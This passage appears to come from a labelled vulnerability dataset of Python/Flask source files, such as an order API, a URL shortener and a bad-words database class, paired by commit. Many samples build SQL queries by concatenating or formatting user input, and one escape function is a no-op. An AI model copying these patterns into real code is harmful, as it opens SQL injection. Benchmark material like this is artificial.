  cur.execute(sql)\n    maxID = cur.fetchone()\n    if maxID[0] == None:\n        return 1\n    else:\n        return maxID[0] + 1\n\n\ndef printTables():\n    cur = conn.cursor()\n    strout = \"--------------------------ListingTable---------------------------<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"||\t\"\n        strout = strout + \"<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_tags_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    strout += \"<br><br><br>--------------------------TagTable-------------------------<br>\"\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"\t\"\n\n        strout = strout + \"<br>\"\n    return strout\n\n\n#--------------------------------------------------- CANCEL ---------------------------------------------------#\n\n\n@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])\ndef cancel(clientId, listingId):\n    \"\"\"\n    Cancels the order with specified client id and listing id and returns it.\n    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already\n    been canceled or fulfilled.\n    \"\"\"\n\n    in_progress = get_in_progress_order(clientId, listingId)\n\n    if in_progress:\n        cancel_order(clientId, listingId)\n        output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n        return output  # convert to string before returning\n    else:\n        return 'order not found'\n\n\ndef get_in_progress_order(clientId, listingId):\n    \"\"\"\n    Return the in progress order that corresponds with ClientId and ListingID\n    \"\"\"\n    matched_rows = []\n\n    order = conn.cursor()\n    order.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                  \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId) + \" AND \\\"ListingID\\\" = \" + str(listingId) +\n                  \" AND t1.\\\"Status\\\" = \\'In progress\\'\")\n\n    order_row = order.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = order.fetchone()\n\n    order.close()\n\n    return matched_rows\n\n\ndef cancel_order(clientId, listingId):\n    \"\"\"\n    given a clientId and listingId cancel the order in progress associated with them\n    \"\"\"\n    order = conn.cursor()\n    order.execute(\n        \"UPDATE public.\\\"Order\\\" SET \\\"Status\\\" = 'Canceled' WHERE \\\"ClientID\\\" = \" + str(clientId) +\n        \" AND \\\"ListingID\\\" = \" + str(listingId) + \" AND \\\"Status\\\" = \\'In progress\\'\")\n    conn.commit()\n\n    order.close()\n\n\ndef order_to_json(rows):\n    \"\"\"\n    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.\n    \"\"\"\n    string = \"\"\n    for i in range(len(rows)):\n        string += json.dumps({'ClientID': rows[i][0],\n                              'ListingID': rows[i][1],\n                              'Status': rows[i][2],\n                              'DateTime': rows[i][3].__str__()})\n        if i != len(rows) - 1:\n            string += \",\"\n\n    return string\n\n\n#--------------------------------------------------- getUserOrders ---------------------------------------------------#\n\n\n@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])\ndef getUserOrders(clientId):\n    \"\"\"\n    Retruns a list of jsons representing tupples in the Orders table for the given client\n    \"\"\"\n\n    in_progress = queryOrderUsingClientID(clientId)\n\n    output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n    return \"[\" + output + \"]\"  # convert to string before returning\n\n\ndef queryOrderUsingClientID(clientId):\n    \"\"\"\n    Return a list of Order tuples belonging to the client with the given id.\n    \"\"\"\n    matched_rows = []\n\n    orders = conn.cursor()\n    orders.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                   \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId))\n\n    order_row = orders.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = orders.fetchone()\n\n    orders.close()\n\n    return matched_rows\n\n\n#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#\n\n\ncompleted = \"\\'Completed\\'\"\n\n\n@app.route(\"/api/markComplete/<int:clientID>/<int:listingID>\", methods=['GET'])\ndef mark_as_complete(clientID, listingID):\n    \"\"\" A function that changes the status of the order with listing id listing_id to complete.\n        Returns \"Success\" on a sucessful change of the listing id's order to complete.\n\n        @param clientID: the client id number to change the status.\n        @param listingID: the listing id number to change the status.\n        @rtype: str\n    \"\"\"\n\n    sql = \\\n        \"\"\"\n            UPDATE public.{}\n            SET {} = {}\n            WHERE {} = {} AND {} = {}\n        \"\"\".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),\n                   order_client_id_col, str(clientID))\n\n    cur = conn.cursor()\n    try:\n        cur.execute(sql)\n        conn.commit()\n    except Exception as e:\n        raise Exception(e)\n\n    # Check to see if a row in the database has been updated.\n    if cur.rowcount == 0:\n        raise Exception(\"The status of listing id's order was not changed. ClientID or ListingID may be out of range.\")\n    return \"Success\"\n\n\n#--------------------------------------------------- SEARCH ---------------------------------------------------#\n\n\n@app.route('/api/search/<string:search_query>', methods=['GET'])\ndef search(search_query):\n    \"\"\"\n    Return a string representation of a list of JSON objects. This list contains\n    objects that correspond to listings that match names or tags in the search query.\n    \"\"\"\n    # separate words in search_query with '+' in place of spaces\n    search_terms = search_query.split('+')\n\n    # want to remove whitespace and empty elements from the list\n    search_terms_filtered = []\n\n    for search_term in search_terms:\n        if not search_term.isspace() and not search_term == '':\n            search_terms_filtered.append(search_term)\n\n    matched_rows_by_name = get_rows_from_name(search_terms_filtered)\n\n    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)\n\n    matched_rows = matched_rows_by_name + matched_rows_by_tag\n\n    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows\n\n    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': unique_matched_rows})  # convert to string before returning\n\n\ndef get_rows_from_name(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose Food Names correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_names = conn.cursor()\n        search_names.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t1.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_food_name_col,\n                                                                              search_term))\n\n        search_names_row = search_names.fetchone()\n\n        while search_names_row is not None:\n            matched_rows.append(search_names_row)\n            search_names_row = search_names.fetchone()\n\n        search_names.close()\n\n    return matched_rows\n\n\ndef get_rows_from_tag(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose tags correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_tags = conn.cursor()\n        search_tags.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t2.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_tags_tag_col,\n                                                                              search_term))\n\n        search_tags_row = search_tags.fetchone()\n\n        while search_tags_row is not None:\n            matched_rows.append(search_tags_row)\n            search_tags_row = search_tags.fetchone()\n\n        search_tags.close()\n\n    return matched_rows\n\n\ndef rows_to_json(rows):\n    \"\"\"\n    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.\n    \"\"\"\n    for i in range(len(rows)):\n        rows[i] = json.dumps({'ListingID': rows[i][0],\n                                'CookID': rows[i][1],\n                                'Food Name': rows[i][2],\n                                'Price': rows[i][3],\n                                'Location': rows[i][4],\n                                'Image': rows[i][5]})\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=80)\n    # host=\"0.0.0.0\", port=80\n/n/n/n", "label": 1}, {"id": "071497f90bcf7336c44e135d5ef4bd87898fa8d0", "code": "app.py/n/n#!/usr/bin/env python2.7\n\nimport sys\nimport os\n\n# Flask Import\nfrom flask import Flask , request , redirect , render_template , url_for \nfrom flask import jsonify , abort , make_response \nimport MySQLdb\n\n# Toekn and URL check import\nfrom check_encode import random_token , url_check\nfrom display_list import list_data\n\nfrom sql_table import mysql_table\n\n# Config import\nimport config\n\n# Import Loggers\nimport logging\nfrom logging.handlers import RotatingFileHandler\nfrom time import strftime\nimport traceback\n\n# Setting UTF-8 encoding\n\nreload(sys)\nsys.setdefaultencoding('UTF-8')\nos.putenv('LANG', 'en_US.UTF-8')\nos.putenv('LC_ALL', 'en_US.UTF-8')\n\napp = Flask(__name__)\napp.config.from_object('config')\n\nshorty_host = config.domain\n\n# MySQL configurations\n\nhost = config.host\nuser = config.user\npasswrd = config.passwrd\ndb = config.db\n\n@app.route('/analytics/<short_url>')\ndef analytics(short_url):\n\n\tinfo_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)\n\treturn render_template(\"data.html\" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\\\n\t browser = browser_fetch , platform = platform_fetch)\n\n\n@app.route('/' , methods=['GET' , 'POST'])\ndef index():\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\t\n\t# Return the full table to displat on index.\n\tlist_sql = \"SELECT * FROM WEB_URL;\"\n\tcursor.execute(list_sql)\n\tresult_all_fetch = cursor.fetchall()\n\n\t\t\n\tif request.method == 'POST':\n\t\tog_url = request.form.get('url_input')\n\t\tcustom_suff = request.form.get('url_custom')\n\t\ttag_url = request.form.get('url_tag')\n\t\tif custom_suff == '':\n\t\t\ttoken_string =  random_token()\n\t\telse:\n\t\t\ttoken_string = custom_suff\n\t\tif og_url != '':\n\t\t\tif url_check(og_url) == True:\n\t\t\t\t\n\t\t\t\t# Check's for existing suffix \n\t\t\t\tcheck_row = \"SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE\"\n\t\t\t\tcursor.execute(check_row,(token_string,))\n\t\t\t\tcheck_fetch = cursor.fetchone()\n\n\t\t\t\tif (check_fetch is None):\n\t\t\t\t\tinsert_row = \"\"\"\n\t\t\t\t\t\tINSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)\n\t\t\t\t\t\t\"\"\"\n\t\t\t\t\tresult_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))\n\t\t\t\t\tconn.commit()\n\t\t\t\t\tconn.close()\n\t\t\t\t\te = ''\n\t\t\t\t\treturn render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )\n\t\t\t\telse:\n\t\t\t\t\te = \"The Custom suffix already exists . Please use another suffix or leave it blank for random suffix.\"\n\t\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\t\t\telse:\n\t\t\t\te = \"URL entered doesn't seem valid , Enter a valid URL.\"\n\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\n\t\telse:\n\t\t\te = \"Enter a URL.\"\n\t\t\treturn render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)\n\telse:\t\n\t\te = ''\n\t\treturn render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )\n\t\n# Rerouting funciton\t\n\n@app.route('/<short_url>')\ndef reroute(short_url):\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\tplatform = request.user_agent.platform\n\tbrowser =  request.user_agent.browser\n\tcounter = 1\n\n\t# Platform , Browser vars\n\t\n\tbrowser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}\n\tplatform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}\n\n\t# Analytics\n\tif browser in browser_dict:\n\t\tbrowser_dict[browser] += 1\n\telse:\t\t\t\t\t\t\t\t\n\t\tbrowser_dict['other'] += 1\n\t\n\tif platform in platform_dict.iterkeys():\n\t\tplatform_dict[platform] += 1\n\telse:\n\t\tplatform_dict['other'] += 1\n\t\t\t\n\tcursor.execute(\"SELECT URL FROM WEB_URL WHERE S_URL = %s;\" ,(short_url,) )\n\n\ttry:\n\t\tnew_url = cursor.fetchone()[0]\n\t\tprint new_url\n\t\t# Update Counters \n\t\t\n\t\tcounter_sql = \"\\\n\t\t\t\tUPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\\\n\t\t\t\tSAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\\\n\t\t\t\tWINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = %s;\".\\\n\t\t\t\tformat(tn = \"WEB_URL\" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\\\n\t\t\t\tog_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\\\n\t\t\t\tog_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'])\n\t\tres_update = cursor.execute(counter_sql, (short_url, ))\n\t\tconn.commit()\n\t\tconn.close()\n\n\t\treturn redirect(new_url)\n\n\texcept Exception as e:\n\t\te = \"Something went wrong.Please try again.\"\n\t\treturn render_template('404.html') ,404\n\n# Search results\n@app.route('/search' ,  methods=['GET' , 'POST'])\ndef search():\n\ts_tag = request.form.get('search_url')\n\tif s_tag == \"\":\n\t\treturn render_template('index.html', error = \"Please enter a search term\")\n\telse:\n\t\tconn = MySQLdb.connect(host , user , passwrd, db)\n\t\tcursor = conn.cursor()\n\t\t\n\t\tsearch_tag_sql = \"SELECT * FROM WEB_URL WHERE TAG = %s\" \n\t\tcursor.execute(search_tag_sql , (s_tag, ) )\n\t\tsearch_tag_fetch = cursor.fetchall()\n\t\tconn.close()\n\t\treturn render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )\n\n\n@app.after_request\ndef after_request(response):\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \\\n\t\t\t\trequest.method , request.scheme , request.full_path , response.status)\n\treturn response\n\n\n@app.errorhandler(Exception)\ndef exceptions(e):\n\ttb = traceback.format_exc()\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\\n%s',\n        timestamp, request.remote_addr, request.method,\n        request.scheme, request.full_path, tb)\n\treturn make_response(e , 405)\n\nif __name__ == '__main__':\n\n\t# Logging handler\n\thandler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)\n\tlogger = logging.getLogger('tdm')\n\tlogger.setLevel(logging.ERROR)\n\tlogger.addHandler(handler)\n\tapp.run(host='127.0.0.1' , port=5000)\n\n/n/n/n", "label": 0}, {"id": "071497f90bcf7336c44e135d5ef4bd87898fa8d0", "code": "/app.py/n/n#!/usr/bin/env python2.7\n\nimport sys\nimport os\n\n# Flask Import\nfrom flask import Flask , request , redirect , render_template , url_for \nfrom flask import jsonify , abort , make_response \nimport MySQLdb\n\n# Toekn and URL check import\nfrom check_encode import random_token , url_check\nfrom display_list import list_data\n\nfrom sql_table import mysql_table\n\n# Config import\nimport config\n\n# Import Loggers\nimport logging\nfrom logging.handlers import RotatingFileHandler\nfrom time import strftime\nimport traceback\n\n# Setting UTF-8 encoding\n\nreload(sys)\nsys.setdefaultencoding('UTF-8')\nos.putenv('LANG', 'en_US.UTF-8')\nos.putenv('LC_ALL', 'en_US.UTF-8')\n\napp = Flask(__name__)\napp.config.from_object('config')\n\nshorty_host = config.domain\n\n# MySQL configurations\n\nhost = config.host\nuser = config.user\npasswrd = config.passwrd\ndb = config.db\n\n@app.route('/analytics/<short_url>')\ndef analytics(short_url):\n\n\tinfo_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)\n\treturn render_template(\"data.html\" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\\\n\t browser = browser_fetch , platform = platform_fetch)\n\n\n@app.route('/' , methods=['GET' , 'POST'])\ndef index():\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\t\n\t# Return the full table to displat on index.\n\tlist_sql = \"SELECT * FROM WEB_URL;\"\n\tcursor.execute(list_sql)\n\tresult_all_fetch = cursor.fetchall()\n\n\t\t\n\tif request.method == 'POST':\n\t\tog_url = request.form.get('url_input')\n\t\tcustom_suff = request.form.get('url_custom')\n\t\ttag_url = request.form.get('url_tag')\n\t\tif custom_suff == '':\n\t\t\ttoken_string =  random_token()\n\t\telse:\n\t\t\ttoken_string = custom_suff\n\t\tif og_url != '':\n\t\t\tif url_check(og_url) == True:\n\t\t\t\t\n\t\t\t\t# Check's for existing suffix \n\t\t\t\tcheck_row = \"SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE\"\n\t\t\t\tcursor.execute(check_row,(token_string,))\n\t\t\t\tcheck_fetch = cursor.fetchone()\n\n\t\t\t\tif (check_fetch is None):\n\t\t\t\t\tinsert_row = \"\"\"\n\t\t\t\t\t\tINSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)\n\t\t\t\t\t\t\"\"\"\n\t\t\t\t\tresult_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))\n\t\t\t\t\tconn.commit()\n\t\t\t\t\tconn.close()\n\t\t\t\t\te = ''\n\t\t\t\t\treturn render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )\n\t\t\t\telse:\n\t\t\t\t\te = \"The Custom suffix already exists . Please use another suffix or leave it blank for random suffix.\"\n\t\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\t\t\telse:\n\t\t\t\te = \"URL entered doesn't seem valid , Enter a valid URL.\"\n\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\n\t\telse:\n\t\t\te = \"Enter a URL.\"\n\t\t\treturn render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)\n\telse:\t\n\t\te = ''\n\t\treturn render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )\n\t\n# Rerouting funciton\t\n\n@app.route('/<short_url>')\ndef reroute(short_url):\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\tplatform = request.user_agent.platform\n\tbrowser =  request.user_agent.browser\n\tcounter = 1\n\n\t# Platform , Browser vars\n\t\n\tbrowser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}\n\tplatform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}\n\n\t# Analytics\n\tif browser in browser_dict:\n\t\tbrowser_dict[browser] += 1\n\telse:\t\t\t\t\t\t\t\t\n\t\tbrowser_dict['other'] += 1\n\t\n\tif platform in platform_dict.iterkeys():\n\t\tplatform_dict[platform] += 1\n\telse:\n\t\tplatform_dict['other'] += 1\n\t\t\t\n\tcursor.execute(\"SELECT URL FROM WEB_URL WHERE S_URL = %s;\" ,(short_url,) )\n\n\ttry:\n\t\tnew_url = cursor.fetchone()[0]\n\t\tprint new_url\n\t\t# Update Counters \n\t\t\n\t\tcounter_sql = \"\\\n\t\t\t\tUPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\\\n\t\t\t\tSAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\\\n\t\t\t\tWINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = '{surl}';\".\\\n\t\t\t\tformat(tn = \"WEB_URL\" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\\\n\t\t\t\tog_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\\\n\t\t\t\tog_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'] ,\\\n\t\t\t\tsurl = short_url)\n\t\tres_update = cursor.execute(counter_sql)\n\t\tconn.commit()\n\t\tconn.close()\n\n\t\treturn redirect(new_url)\n\n\texcept Exception as e:\n\t\te = \"Something went wrong.Please try again.\"\n\t\treturn render_template('404.html') ,404\n\n# Search results\n@app.route('/search' ,  methods=['GET' , 'POST'])\ndef search():\n\ts_tag = request.form.get('search_url')\n\tif s_tag == \"\":\n\t\treturn render_template('index.html', error = \"Please enter a search term\")\n\telse:\n\t\tconn = MySQLdb.connect(host , user , passwrd, db)\n\t\tcursor = conn.cursor()\n\t\t\n\t\tsearch_tag_sql = \"SELECT * FROM WEB_URL WHERE TAG = %s\" \n\t\tcursor.execute(search_tag_sql , (s_tag, ) )\n\t\tsearch_tag_fetch = cursor.fetchall()\n\t\tconn.close()\n\t\treturn render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )\n\n\n@app.after_request\ndef after_request(response):\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \\\n\t\t\t\trequest.method , request.scheme , request.full_path , response.status)\n\treturn response\n\n\n@app.errorhandler(Exception)\ndef exceptions(e):\n\ttb = traceback.format_exc()\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\\n%s',\n        timestamp, request.remote_addr, request.method,\n        request.scheme, request.full_path, tb)\n\treturn make_response(e , 405)\n\nif __name__ == '__main__':\n\n\t# Logging handler\n\thandler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)\n\tlogger = logging.getLogger('tdm')\n\tlogger.setLevel(logging.ERROR)\n\tlogger.addHandler(handler)\n\tapp.run(host='127.0.0.1' , port=5000)\n\n/n/n/n", "label": 1}, {"id": "3c56a5ab85df68f79ded480ad026f974bce7d48c", "code": "server/functions/badWords.py/n/nimport mysql.connector\n\nclass BadWordsDB():\n    from serverSetup import DBUSER,DBPASS\n\n    def __init__(self,host,user,passwd,database,filterList=[]):\n        self.host= host\n        self.user = user\n        self.passwd = passwd\n        self.database = database\n        self.filterList = filterList\n\n    def connect(self):\n        self.mydb = mysql.connector.connect(\n            host=self.host,\n            user=self.user,\n            passwd=self.passwd,\n            database=self.database\n        )\n        self.cursor = self.mydb.cursor()\n\n    def close(self):\n        self.cursor.close()\n        self.mydb.close()\n\n    def escapeString(self,sqlString):\n        sqlString.replace('\\'','')\n        return sqlString\n\n    def fetch(self):\n        self.connect()\n\n        sqlFormula = \"SELECT * FROM badwords\"\n        self.cursor.execute(sqlFormula)\n        myresults = self.cursor.fetchall()\n\n        # Format everything\n        badWordArray = []\n        for row in myresults:\n            badWordArray.append(row[0])\n\n        self.close()\n\n        return badWordArray\n    \n    def insert(self,targetWord,badwordlist):\n        if not targetWord.lower() in badwordlist:\n            self.connect()\n\n            sqlFormula = \"INSERT INTO badwords (word, badness) VALUE (%s,%s)\"\n            word = (self.escapeString(targetWord.lower()),1)\n            \n            self.cursor.execute(sqlFormula,word)\n            self.close()\n    \n    def printAll(self):\n        baddies = self.fetch()\n        return ' '.join(baddies)\n\n    def delete(self,targetWord):\n        self.connect()\n\n        sqlFormula = \"DELETE FROM badwords WHERE word='%s'\" % targetWord\n        sqlFormula = self.escapeString(sqlFormula)\n\n        self.cursor.execute(sqlFormula)\n        self.close()\n/n/n/n", "label": 0}, {"id": "3c56a5ab85df68f79ded480ad026f974bce7d48c", "code": "/server/functions/badWords.py/n/nimport mysql.connector\n\nclass BadWordsDB():\n    from serverSetup import DBUSER,DBPASS\n\n    def __init__(self,host,user,passwd,database,filterList=[]):\n        self.host= host\n        self.user = user\n        self.passwd = passwd\n        self.database = database\n        self.filterList = filterList\n\n    def connect(self):\n        self.mydb = mysql.connector.connect(\n            host=self.host,\n            user=self.user,\n            passwd=self.passwd,\n            database=self.database\n        )\n        self.cursor = self.mydb.cursor()\n\n    def close(self):\n        self.cursor.close()\n        self.mydb.close()\n\n    def fetch(self):\n        self.connect()\n\n        sqlFormula = \"SELECT * FROM badwords\"\n        self.cursor.execute(sqlFormula)\n        myresults = self.cursor.fetchall()\n\n        # Format everything\n        badWordArray = []\n        for row in myresults:\n            badWordArray.append(row[0])\n\n        self.close()\n\n        return badWordArray\n    \n    def insert(self,targetWord,badwordlist):\n        if not targetWord.lower() in badwordlist:\n            self.connect()\n\n            sqlFormula = \"INSERT INTO badwords (word, badness) VALUE (%s,%s)\"\n            word = (targetWord.lower(),1)\n\n            self.cursor.execute(sqlFormula, word)\n            self.close()\n    \n    def printAll(self):\n        baddies = self.fetch()\n        return ' '.join(baddies)\n\n    def delete(self,targetWord):\n        self.connect()\n\n        sqlFormula = \"DELETE FROM badwords WHERE word='%s'\" % targetWord\n\n        self.cursor.execute(sqlFormula)\n        self.close()\n/n/n/n", "label": 1}, {"id": "49c1e478193930ddc9f4cfb873cfab8d8f5653bc", "code": "vagrant/4-project/boardgameclub/views.py/n/nfrom flask import (render_template, url_for, request, redirect, session, abort,\n                   make_response, jsonify, flash)\nimport sqlalchemy\nimport sqlalchemy.orm.exc\nimport requests\nfrom xml.etree import ElementTree\nimport json\nimport time\nimport string\nimport random\nfrom decimal import Decimal\nfrom oauth2client import client\nfrom boardgameclub import app\nfrom boardgameclub.database import db_session\nfrom boardgameclub.models import (Club, Game, Post,  User, GameCategory,\n                                  ClubAdmin, clubs_games_assoc,\n                                  users_games_assoc)\n\n\n###################\n# Csrf protection #\n###################\n\n# Implemented as per:\n# http://flask.pocoo.org/snippets/3/' posted by Dan Jacob on 2010-05-03\n# but with only one token per session.\n\n@app.before_request\ndef csrf_protect():\n    \"\"\"Abort create, update and delete requests without correct csrf tokens.\"\"\"\n    if request.method in ('POST', 'PATCH', 'DELETE'):\n        print 'validating csrf token'\n        token = session.get('_csrf_token')\n        token_from_json = request.get_json().get(\n            '_csrf_token') if request.get_json() else None\n        if (\n            not token or\n            token not in (request.form.get('_csrf_token'), token_from_json)\n        ):\n            print 'failed csrf token test'\n            abort(403)\n        else:\n            print 'csrf token ok'\n\n\ndef generate_csrf_token():\n    \"\"\"Add csrf token to the session and return the csrf token.\"\"\"\n    if '_csrf_token' not in session:\n        print 'generating csrf token'\n        session['_csrf_token'] = random_string()\n    return session['_csrf_token']\n\n\ndef random_string():\n    \"\"\"Create a random string.\"\"\"\n    chars = string.ascii_letters + string.digits\n    return ''.join([chars[random.randint(0, 61)] for i in range(20)])\n\n\napp.jinja_env.globals['csrf_token'] = generate_csrf_token\n\n\n###############################\n# Database session management #\n###############################\n\n@app.teardown_appcontext\ndef remove_session(exception=None):\n    \"\"\"Remove database session at the end of each request.\"\"\"\n    db_session.remove()\n\n\n####################################\n# Authentication and authorisation #\n####################################\n\n@app.before_request\ndef ownership_required():\n    \"\"\"Prevent access to update and delete endpoints by\n    non-authorized users.\n    \"\"\"\n    if (\n        request.endpoint in ('profile_game_add', 'club_game_add') or\n        request.method in ('PATCH', 'DELETE')\n    ):\n        print 'checking ownership'\n        if 'user_id' not in session or not check_ownership():\n            abort(403)\n        else:\n            print 'ownership ok'\n\n\ndef check_ownership():\n    \"\"\"Verify if the user is the owner of the requested resource.\"\"\"\n    user_id = session.get('user_id')\n    if not user_id:\n        return False\n    elif 'club_' in request.endpoint or 'home' in request.endpoint:\n        admin = ClubAdmin.query.filter_by(user_id=user_id).scalar()\n        return True if admin else False\n    elif 'profile_' in request.endpoint:\n        return request.view_args['user_id'] == user_id\n    elif request.endpoint == 'post_':\n        owned_post = Post.query.filter_by(\n            id=request.view_args['post_id'], user_id=user_id).scalar()\n        return True if owned_post else False\n    else:\n        print 'Unable to verify ownership'\n        return False\n\n\n@app.before_request\ndef login_required():\n    \"\"\"Prevent access to create endpoints by non-authenticated users.\"\"\"\n    if (\n        (request.endpoint in ('post_add', 'profile_add', 'g_disconnect') or\n         request.endpoint == 'game_' and request.method == 'POST') and\n        'username' not in session\n    ):\n        abort(401)\n\n\ndef validate_id_token(token, token_jwt):\n    \"\"\"Validate id_token as per\n    https://developers.google.com/identity/protocols/OpenIDConnect.\n    \"\"\"\n    url = 'https://www.googleapis.com/oauth2/v3/tokeninfo'\n    params = 'id_token={}'.format(token_jwt)\n    r = requests.get(url, params=params)\n\n    if (\n        # Is the token properly signed by the issuer?\n        r.status_code == 200 and r.json()['aud'] == token['aud'] and\n        # Was it issued by google?\n        token['iss'] in ('https://accounts.google.com',\n                         'accounts.google.com') and\n        # Is it 